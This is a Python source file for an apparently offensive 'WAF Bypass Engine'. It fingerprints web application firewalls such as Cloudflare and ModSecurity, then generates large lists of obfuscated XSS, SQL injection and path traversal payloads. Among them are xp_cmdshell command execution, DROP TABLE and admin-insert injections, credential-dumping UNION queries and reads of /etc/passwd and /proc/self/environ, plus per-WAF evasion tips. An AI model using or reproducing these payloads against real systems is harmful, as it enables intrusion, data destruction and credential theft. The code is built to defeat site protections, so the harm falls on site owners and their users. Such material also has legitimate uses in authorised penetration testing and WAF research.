# WAF Bypass Engine - Halil Berkay Şahin
import base64
import random
import re
import urllib.parse


class WAFBypassEngine:
    """Advanced WAF bypass payload generator and encoder."""

    def __init__(self):
        self.encoding_techniques = [
            "url_encoding",
            "double_url_encoding",
            "unicode_encoding",
            "html_entity_encoding",
            "base64_encoding",
            "hex_encoding",
            "case_variation",
            "comment_insertion",
            "whitespace_variation",
            "char_substitution",
        ]

    def get_waf_signatures(self):
        """Get common WAF signatures and detection patterns."""
        return {
            "cloudflare": [r"cloudflare", r"cf-ray", r"error 1020", r"attention required"],
            "akamai": [r"akamai", r"reference #[0-9a-f]+", r"access denied"],
            "aws_waf": [r"aws", r"cloudfront", r"blocked by aws"],
            "f5_bigip": [r"f5", r"bigip", r"asm policy", r"x-waf-event"],
            "imperva": [r"imperva", r"incapsula", r"x-iinfo"],
            "mod_security": [r"mod_security", r"modsecurity", r"not acceptable"],
            "barracuda": [r"barracuda", r"barra", r"web application firewall"],
        }

    def detect_waf(self, response_headers, response_content):
        """Detect WAF type from response."""
        detected_wafs = []
        waf_signatures = self.get_waf_signatures()

        # Check headers
        headers_str = str(response_headers).lower()
        content_str = response_content.lower()

        for waf_name, signatures in waf_signatures.items():
            for signature in signatures:
                if re.search(signature, headers_str) or re.search(signature, content_str):
                    detected_wafs.append(waf_name)
                    break

        return detected_wafs

    def url_encode(self, payload):
        """URL encode payload."""
        return urllib.parse.quote(payload, safe="")

    def double_url_encode(self, payload):
        """Double URL encode payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def unicode_encode(self, payload):
        """Unicode encode payload."""
        encoded = ""
        for char in payload:
            if ord(char) > 127 or char in "<>\"'/(){}[]":
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded

    def html_entity_encode(self, payload):
        """HTML entity encode payload."""
        entities = {
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#x27;",
            "&": "&amp;",
            "/": "&#x2F;",
            "(": "&#40;",
            ")": "&#41;",
            "=": "&#61;",
            " ": "&#32;",
        }

        encoded = payload
        for char, entity in entities.items():
            encoded = encoded.replace(char, entity)

        return encoded

    def base64_encode(self, payload):
        """Base64 encode payload."""
        return base64.b64encode(payload.encode()).decode()

    def hex_encode(self, payload):
        """Hex encode payload."""
        return "".join([f"\\x{ord(c):02x}" for c in payload])

    def case_variation(self, payload):
        """Apply case variations to payload."""
        variations = []

        # All uppercase
        variations.append(payload.upper())

        # All lowercase
        variations.append(payload.lower())

        # Mixed case (random)
        mixed = "".join([c.upper() if random.choice([True, False]) else c.lower() for c in payload])
        variations.append(mixed)

        # sCrIpT style
        script_style = ""
        for i, c in enumerate(payload):
            if i % 2 == 0:
                script_style += c.lower()
            else:
                script_style += c.upper()
        variations.append(script_style)

        return variations

    def comment_insertion(self, payload):
        """Insert comments to bypass filters."""
        comment_patterns = ["/**/", "/* */", "/*anything*/", "<!--", "-->", "<!---->", "/**_*/", "/*/**/"]

        variations = []
        for pattern in comment_patterns:
            # Insert in common positions
            if "<script>" in payload.lower():
                variations.append(payload.replace("<script>", f"<script{pattern}>"))
                variations.append(payload.replace("script", f"scr{pattern}ipt"))

            if "alert(" in payload.lower():
                variations.append(payload.replace("alert(", f"alert{pattern}("))

            if "javascript:" in payload.lower():
                variations.append(payload.replace("javascript:", f"java{pattern}script:"))

        return variations

    def whitespace_variation(self, payload):
        """Apply whitespace variations."""
        whitespace_chars = [
            "\t",
            "\n",
            "\r",
            "\f",
            "\v",
            "\u00A0",
            "\u1680",
            "\u2000",
            "\u2001",
            "\u2002",
            "\u2003",
            "\u2004",
            "\u2005",
            "\u2006",
            "\u2007",
            "\u2008",
            "\u2009",
            "\u200A",
            "\u2028",
            "\u2029",
            "\u202F",
            "\u205F",
            "\u3000",
        ]

        variations = []
        for ws_char in whitespace_chars[:5]:  # Use first 5 to avoid too many variations
            # Replace spaces with alternative whitespace
            variations.append(payload.replace(" ", ws_char))

            # Add whitespace in strategic positions
            if "<script>" in payload.lower():
                variations.append(payload.replace("<script>", f"<{ws_char}script{ws_char}>"))

            if "alert(" in payload.lower():
                variations.append(payload.replace("alert(", f"alert{ws_char}("))

        return variations

    def char_substitution(self, payload):
        """Apply character substitutions."""
        substitutions = {
            # HTML/JS equivalents
            "alert": ["prompt", "confirm", "console.log"],
            "()": ["``", "[]"],
            '"': ["'", "`"],
            "'": ['"', "`"],
            "=": ["==", "==="],
            " ": ["\t", "\n", "/**/"],
            "script": ["SCRIPT", "Script", "sCrIpT"],
            "javascript": ["JAVASCRIPT", "Javascript", "jAvAsCrIpT"],
            "eval": ["Function", "setTimeout", "setInterval"],
            "document": ["window.document", 'window["document"]', "top.document"],
        }

        variations = [payload]
        for original, replacements in substitutions.items():
            for replacement in replacements:
                if original in payload.lower():
                    variations.append(payload.replace(original, replacement))

        return variations

    def generate_xss_bypasses(self, base_payload="<script>alert(1)</script>"):
        """Generate XSS WAF bypass payloads."""
        bypasses = [base_payload]

        # Basic encoding bypasses
        bypasses.extend(
            [
                self.url_encode(base_payload),
                self.double_url_encode(base_payload),
                self.unicode_encode(base_payload),
                self.html_entity_encode(base_payload),
                f"data:text/html;base64,{self.base64_encode(base_payload)}",
            ]
        )

        # Case variation bypasses
        bypasses.extend(self.case_variation(base_payload))

        # Comment insertion bypasses
        bypasses.extend(self.comment_insertion(base_payload))

        # Whitespace variation bypasses
        bypasses.extend(self.whitespace_variation(base_payload))

        # Character substitution bypasses
        bypasses.extend(self.char_substitution(base_payload))

        # Advanced XSS vectors
        advanced_vectors = [
            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            '<iframe src="javascript:alert(1)">',
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            # Script variations
            "<script>alert`1`</script>",
            "<script>(alert)(1)</script>",
            "<script>eval(alert(1))</script>",
            "<script>setTimeout(alert(1),0)</script>",
            '<script>Function("alert(1)")()</script>',
            # Polyglot payloads
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            # Filter bypasses
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script/random>alert(1)</script>",
            "<script/**/src=data:text/javascript,alert(1)>",
            # Template injection
            "{{alert(1)}}",
            "${alert(1)}",
            "#{alert(1)}",
            "%{alert(1)}",
            # DOM-based
            '<script>document.location="javascript:alert(1)"</script>',
            '<script>window.location="javascript:alert(1)"</script>',
            # WAF-specific bypasses
            "<script>alert(/XSS/)</script>",
            "<script>a=alert,a(1)</script>",
            '<script>eval(atob("YWxlcnQoMSk="))</script>',  # base64: alert(1)
            '<script>Function("return alert")()(1)</script>',
            # Unicode normalization bypasses
            "<script>alert\u0028\u0031\u0029</script>",
            "<script>＜img src=x onerror=alert(1)＞</script>",
            # CSS-based
            '<style>@import"javascript:alert(1)"</style>',
            '<link rel=stylesheet href="javascript:alert(1)">',
            # SVG-based
            "<svg><script>alert(1)</script></svg>",
            "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
            # Math-based
            "<math><mtext><script>alert(1)</script></mtext></math>",
            # Audio/Video-based
            "<audio src=x onerror=alert(1)>",
            "<video src=x onerror=alert(1)>",
            # Object/Embed-based
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            # Form-based
            '<form><button formaction="javascript:alert(1)">Submit</form>',
            '<input type="image" formaction="javascript:alert(1)">',
            # Meta-based
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            # Base-based
            '<base href="javascript:alert(1)//">',
            # Noscript-based
            '<noscript><iframe src="javascript:alert(1)"></noscript>',
        ]

        bypasses.extend(advanced_vectors)

        # Apply encoding to advanced vectors
        for vector in advanced_vectors[:10]:  # Apply to first 10 to avoid too many payloads
            bypasses.extend([self.url_encode(vector), self.html_entity_encode(vector)])

        # Remove duplicates while preserving order
        unique_bypasses = []
        seen = set()
        for bypass in bypasses:
            if bypass not in seen:
                unique_bypasses.append(bypass)
                seen.add(bypass)

        return unique_bypasses

    def generate_sqli_bypasses(self, base_payload="' OR 1=1--"):
        """Generate SQL injection WAF bypass payloads."""
        bypasses = [base_payload]

        # Basic encoding bypasses
        bypasses.extend(
            [
                self.url_encode(base_payload),
                self.double_url_encode(base_payload),
                base_payload.replace(" ", "/**/"),
                base_payload.replace(" ", "\t"),
                base_payload.replace(" ", "\n"),
            ]
        )

        # Case variation bypasses
        bypasses.extend(self.case_variation(base_payload))

        # Advanced SQLi vectors
        advanced_vectors = [
            # Comment bypasses
            "'/**/OR/**/1=1--",
            "'/**/OR/**/1=1#",
            "'/**/OR/**/1=1/*",
            "'; /*comment*/ OR 1=1--",
            # Union bypasses
            "'/**/UNION/**/SELECT/**/1,2,3--",
            "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
            "'/**/UnIoN/**/SeLeCt/**/1,2,3--",
            "'/**//*!UNION*//**//*!SELECT*//**/1,2,3--",
            # MySQL-specific bypasses
            "'/**/||/**/1=1--",
            "'/**/&&/**/1=1--",
            "'/**/OR/**/1/**/=/**/1--",
            "'/*!50000OR*/1=1--",
            "'/*!50000OR*//*!50000*/1=1--",
            # PostgreSQL-specific bypasses
            "';/**/SELECT/**/pg_sleep(5)--",
            "'/**/||/**/CHR(65)||CHR(66)--",
            "'/**/AND/**/1::int=1--",
            # SQL Server-specific bypasses
            "';/**/WAITFOR/**/DELAY/**/'00:00:05'--",
            "'/**/OR/**/1=1;/**/EXEC/**/xp_cmdshell('dir')--",
            "'/**/AND/**/1=CONVERT(INT,(SELECT/**/@@version))--",
            # Oracle-specific bypasses
            "'/**/OR/**/1=1/**/AND/**/ROWNUM=1--",
            "'/**/UNION/**/SELECT/**/banner/**/FROM/**/v$version--",
            "'/**/AND/**/1=CTXSYS.DRITHSX.SN(1,(SELECT/**/user/**/FROM/**/dual))--",
            # Time-based bypasses
            "'/**/OR/**/SLEEP(5)--",
            "'/**/OR/**/BENCHMARK(10000000,MD5(1))--",
            "'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C)--",
            # Boolean-based blind bypasses
            "'/**/AND/**/1=1--",
            "'/**/AND/**/1=2--",
            "'/**/AND/**/SUBSTRING(@@version,1,1)='5'--",
            "'/**/AND/**/LENGTH(database())>0--",
            "'/**/AND/**/ASCII(SUBSTRING((SELECT/**/database()),1,1))>64--",
            # Error-based bypasses
            "'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x5c,0x5c,(SELECT/**/user()),0x5c))--",
            "'/**/AND/**/UPDATEXML(1,CONCAT(0x5c,0x5c,(SELECT/**/user()),0x5c),1)--",
            "'/**/AND/**/EXP(~(SELECT*FROM(SELECT/**/USER())a))--",
            # Stacked queries bypasses
            "';/**/INSERT/**/INTO/**/users/**/VALUES('admin','password')--",
            "';/**/DROP/**/TABLE/**/users--",
            "';/**/CREATE/**/TABLE/**/temp(id/**/INT)--",
            # Bypass filters
            "admin'/**/--",
            "admin'/**/or/**/'1'='1",
            "admin'/**/||/**/'1'='1",
            "admin'/**/&&/**/'1'='1",
            # Hex encoding bypasses
            "'/**/OR/**/0x31=0x31--",
            "'/**/UNION/**/SELECT/**/0x41,0x42,0x43--",
            # Concatenation bypasses
            "'/**/OR/**/CONCAT('a','b')='ab'--",
            "'/**/UNION/**/SELECT/**/CONCAT(username,0x3a,password)/**/FROM/**/users--",
            # Whitespace bypasses
            "'\t\t\tOR\t\t\t1=1--",
            "'\n\n\nOR\n\n\n1=1--",
            "'\r\r\rOR\r\r\r1=1--",
            # URL encoding bypasses
            "%27%20OR%201=1--",
            "%27%2F%2A%2A%2FOR%2F%2A%2A%2F1=1--",
            # Double encoding bypasses
            "%2527%2520OR%25201=1--",
            # Function bypasses
            "'/**/OR/**/USER()='root'--",
            "'/**/OR/**/VERSION()/**/LIKE/**/'5%'--",
            "'/**/OR/**/DATABASE()='mysql'--",
            # Subquery bypasses
            "'/**/OR/**/(SELECT/**/COUNT(*)/**/FROM/**/users)>0--",
            "'/**/OR/**/(SELECT/**/user/**/)='root'--",
            # IF statement bypasses
            "'/**/OR/**/IF(1=1,SLEEP(5),0)--",
            "'/**/OR/**/IF(USER()='root',SLEEP(5),0)--",
            # Case statement bypasses
            "'/**/OR/**/CASE/**/WHEN/**/1=1/**/THEN/**/SLEEP(5)/**/ELSE/**/0/**/END--",
            # Bypass WAF keywords
            "'/**/OR/**/1=1/**/AND/**/'a'='a",
            "'/**/OR/**/1=1/**/AND/**/'b'='b",
            "'/**/OR/**/1/**/IN/**/(1,2,3)--",
            "'/**/OR/**/1/**/BETWEEN/**/1/**/AND/**/3--",
            "'/**/OR/**/EXISTS(SELECT/**/1)--",
            # Alternative operators
            "'/**/OR/**/1/**/LIKE/**/1--",
            "'/**/OR/**/1/**/REGEXP/**/'^1$'--",
            "'/**/OR/**/1/**/RLIKE/**/'^1$'--",
            # Math operations
            "'/**/OR/**/1=2-1--",
            "'/**/OR/**/2=1+1--",
            "'/**/OR/**/3=3*1--",
            "'/**/OR/**/1=4/4--",
            "'/**/OR/**/1=5%4--",
            # String operations
            "'/**/OR/**/'a'=CHAR(97)--",
            "'/**/OR/**/'1'=CAST(1/**/AS/**/CHAR)--",
            "'/**/OR/**/1=CONVERT(INT,'1')--",
        ]

        bypasses.extend(advanced_vectors)

        # Apply encoding to some vectors
        for vector in advanced_vectors[:15]:  # Apply to first 15 to avoid too many payloads
            bypasses.extend([self.url_encode(vector), vector.replace(" ", "/**/")])

        # Remove duplicates while preserving order
        unique_bypasses = []
        seen = set()
        for bypass in bypasses:
            if bypass not in seen:
                unique_bypasses.append(bypass)
                seen.add(bypass)

        return unique_bypasses

    def generate_directory_traversal_bypasses(self, base_payload="../../../etc/passwd"):
        """Generate directory traversal WAF bypass payloads."""
        bypasses = [base_payload]

        # Basic encoding bypasses
        bypasses.extend(
            [
                self.url_encode(base_payload),
                self.double_url_encode(base_payload),
                base_payload.replace("/", "%2f"),
                base_payload.replace(".", "%2e"),
            ]
        )

        # Advanced vectors
        advanced_vectors = [
            # Unicode bypasses
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            # 16-bit Unicode
            "..%u002f..%u002f..%u002fetc%u002fpasswd",
            "..%u2215..%u2215..%u2215etc%u2215passwd",
            # Double encoding
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%252e%252e%252f..%252e%252e%252f..%252e%252e%252fetc%252fpasswd",
            # Null byte bypasses
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            # Windows-style
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            # Mixed separators
            "../..\\../etc/passwd",
            "..\\../\\..\\../etc/passwd",
            # Filter bypasses
            "....//....//....//etc//passwd",
            "..././..././..././etc/passwd",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            # Overly long paths
            "../" * 50 + "etc/passwd",
            "../" * 100 + "etc/passwd",
            # Current directory bypasses
            "./.././.././../etc/passwd",
            "./././../././../././../etc/passwd",
            # Absolute paths
            "/etc/passwd",
            "/var/log/apache2/access.log",
            "/proc/self/environ",
            "/proc/version",
            "/etc/hosts",
            # Case variations
            "../../../ETC/PASSWD",
            "../../../Etc/Passwd",
            "../../../etc/PASSWD",
            # Special characters
            "..;/..;/..;/etc/passwd",
            "..%00/..%00/..%00/etc/passwd",
        ]

        bypasses.extend(advanced_vectors)

        # Remove duplicates
        return list(set(bypasses))

    def analyze_response_for_waf(self, response_headers, response_content, status_code):
        """Analyze response to detect WAF and blocking patterns."""
        analysis = {
            "waf_detected": False,
            "waf_types": [],
            "blocked": False,
            "block_indicators": [],
            "bypass_suggestions": [],
        }

        # Detect WAF
        detected_wafs = self.detect_waf(response_headers, response_content)
        if detected_wafs:
            analysis["waf_detected"] = True
            analysis["waf_types"] = detected_wafs

        # Check for blocking
        block_status_codes = [403, 406, 409, 412, 418, 429, 501, 503]
        block_keywords = [
            "blocked",
            "denied",
            "forbidden",
            "not allowed",
            "security",
            "firewall",
            "protection",
            "filtered",
            "rejected",
            "suspicious",
        ]

        if status_code in block_status_codes:
            analysis["blocked"] = True
            analysis["block_indicators"].append(f"Status code: {status_code}")

        content_lower = response_content.lower()
        for keyword in block_keywords:
            if keyword in content_lower:
                analysis["blocked"] = True
                analysis["block_indicators"].append(f"Keyword: {keyword}")

        # Generate bypass suggestions
        if analysis["blocked"]:
            suggestions = []

            if "cloudflare" in detected_wafs:
                suggestions.extend(
                    [
                        "Try case variation bypasses",
                        "Use unicode encoding",
                        "Insert HTML comments",
                        "Use alternative event handlers",
                    ]
                )

            if "mod_security" in detected_wafs:
                suggestions.extend(
                    [
                        "Use comment insertion",
                        "Try whitespace variations",
                        "Use character substitution",
                        "Try polyglot payloads",
                    ]
                )

            if "akamai" in detected_wafs:
                suggestions.extend(
                    ["Use base64 encoding", "Try hex encoding", "Use double URL encoding", "Fragment payloads"]
                )

            # Generic suggestions
            suggestions.extend(
                [
                    "Try alternative encoding methods",
                    "Use different payload structures",
                    "Fragment the attack across multiple parameters",
                    "Use time-based attacks if error-based fail",
                ]
            )

            analysis["bypass_suggestions"] = list(set(suggestions))

        return analysis
